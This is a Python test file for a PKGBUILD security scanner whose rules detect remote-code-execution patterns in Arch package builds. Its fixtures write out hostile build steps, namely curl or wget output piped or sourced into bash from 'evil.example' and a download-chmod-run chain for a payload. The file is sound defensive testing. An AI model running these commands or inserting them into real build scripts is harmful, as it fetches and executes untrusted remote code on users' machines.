from __future__ import annotations

from aurmanager.rules.rce import (
    RCE001CurlPipeBash,
    RCE002ProcessSubstitutionSource,
    RCE003FetchThenExecute,
    RCE004DisguisedSourceExecuted,
)

from .conftest import rule_ids


def test_rce001_fires_on_curl_pipe_bash(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          curl -s https://evil.example/x.sh | bash
        }
        """
    )
    findings = list(RCE001CurlPipeBash().check(ctx))
    assert len(findings) == 1
    assert findings[0].severity.name == "CRITICAL"


def test_rce001_does_not_fire_on_plain_curl(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          curl -s -o out.tar.gz https://example.com/out.tar.gz
        }
        """
    )
    assert list(RCE001CurlPipeBash().check(ctx)) == []


def test_rce002_fires_on_source_process_substitution(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          source <(wget -qO- https://evil.example/x.sh)
        }
        """
    )
    findings = list(RCE002ProcessSubstitutionSource().check(ctx))
    assert len(findings) == 1
    assert findings[0].severity.name == "CRITICAL"


def test_rce003_fires_once_on_fetch_then_execute_chain(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          curl -s -o /tmp/payload https://evil.example/payload.sh
          chmod +x /tmp/payload
          /tmp/payload
        }
        """
    )
    findings = list(RCE003FetchThenExecute().check(ctx))
    assert len(findings) == 1, "should flag the execution once, not the chmod +x step separately"


def test_rce003_does_not_fire_without_execution(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          curl -s -o out.tar.gz https://example.com/out.tar.gz
          tar xf out.tar.gz
        }
        """
    )
    assert list(RCE003FetchThenExecute().check(ctx)) == []


def test_rce004_fires_on_disguised_patch_source_sourced(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("patches::https://example.invalid/attacker-repo.git")
        build() {
          source patches
        }
        """
    )
    findings = list(RCE004DisguisedSourceExecuted().check(ctx))
    assert len(findings) == 1
    assert findings[0].severity.name == "HIGH"


def test_rce004_does_not_fire_when_patch_is_applied_normally(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("fix.patch::https://example.invalid/fix.patch")
        build() {
          patch -p1 < fix.patch
        }
        """
    )
    assert list(RCE004DisguisedSourceExecuted().check(ctx)) == []
